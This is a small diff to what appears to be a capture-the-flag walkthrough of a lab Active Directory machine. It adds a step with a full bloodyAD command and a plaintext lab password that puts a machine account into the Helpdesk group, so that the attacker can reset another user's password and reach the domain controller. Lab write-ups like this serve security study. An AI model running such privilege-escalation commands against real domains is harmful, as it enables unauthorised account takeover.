@@ -85,7 +85,11 @@
 
 13. Yes, there is! So our game plan now will be to add the IT-Computer3$ account to the Helpdesk group, which can change BB.Morgan's password. This will give us access to the DC.Rustykey.htb machine!
 
-14. 
+14. Add IT-Computer3$ to Helpdesk group via bloodyAD
+
+`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' add groupMember Helpdesk 'IT-Computer3$'`
+
+
 
 
 
